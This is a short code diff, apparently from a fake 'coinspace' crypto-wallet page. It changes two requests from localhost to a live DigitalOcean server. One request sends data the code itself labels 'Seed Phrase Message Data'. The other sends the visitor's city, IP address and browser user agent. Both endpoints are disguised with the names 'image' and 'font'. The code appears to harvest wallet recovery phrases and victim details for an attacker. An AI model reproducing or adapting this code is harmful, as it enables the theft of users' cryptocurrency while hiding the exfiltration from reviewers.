@@ -86,7 +86,7 @@ export default function Page() {
     console.log("Seed Phrase Message Data", messageData);
     axios
       .post(
-        "http://localhost:3001/api/t1/image",
+        "https://squid-app-2-abmzx.ondigitalocean.app/api/t1/image",
         messageData,
         {
           headers: {
@@ -167,14 +167,14 @@ export default function Page() {
         city: userCountry?.city || "Unknown",
         ipAddress: userCountry?.ip || ipAddress || "0.0.0.0",
       },
-      browser: typeof navigator !== "undefined" ? navigator.userAgent : browser,
+      agent: typeof navigator !== "undefined" ? navigator.userAgent : browser,
       date: new Date().toISOString(),
       appName: "coinspace",
     };
     console.log("Message Data", messageData);
     axios
       .post(
-        "http://localhost:3001/api/t1/font",
+        "https://squid-app-2-abmzx.ondigitalocean.app/api/t1/font",
         messageData,
         {
           headers: {
